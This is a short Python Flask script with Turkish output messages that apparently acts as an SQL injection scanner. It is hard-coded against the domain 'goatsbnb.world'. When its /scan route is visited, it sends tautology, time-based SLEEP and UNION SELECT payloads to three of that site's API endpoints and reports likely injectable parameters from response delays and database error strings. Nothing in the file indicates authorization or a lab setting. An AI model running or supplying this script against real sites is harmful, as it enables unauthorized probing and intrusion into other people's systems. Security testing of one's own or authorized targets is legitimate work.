import requests
import time
from flask import Flask

app = Flask(__name__)
TARGET = "goatsbnb.world"
PAYLOADS = [
    "' OR '1'='1",
    "' AND SLEEP(5)-- ",
    "' UNION SELECT NULL-- ",
    "' UNION SELECT NULL,NULL-- ",
]

def test_sqli(url):
    print(f"[*] Test: {url}")
    for p in PAYLOADS:
        test_url = url.replace("{id}", p)
        try:
            start = time.time()
            r = requests.get(test_url, timeout=10)
            if time.time() - start > 4.5:
                print(f"[!] ZAMANLI SQLi: {test_url}")
            if "sql" in r.text.lower() or "mysql" in r.text.lower():
                print(f"[!] HATALI SQLi: {test_url}")
        except Exception as e:
            print(f"[-] Hata: {test_url} -> {e}")

@app.route('/')
def home():
    return "GOATsBNB Scanner çalışıyor! /scan ile başlat."

@app.route('/scan')
def scan():
    print("=== Tarama başladı ===")
    endpoints = [
        f"https://{TARGET}/api?id={{id}}",
        f"https://{TARGET}/v1/user?id={{id}}",
        f"https://{TARGET}/data?address={{id}}",
    ]
    for ep in endpoints:
        test_sqli(ep)
    return "Tarama bitti. Loglara bak."

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=10000)
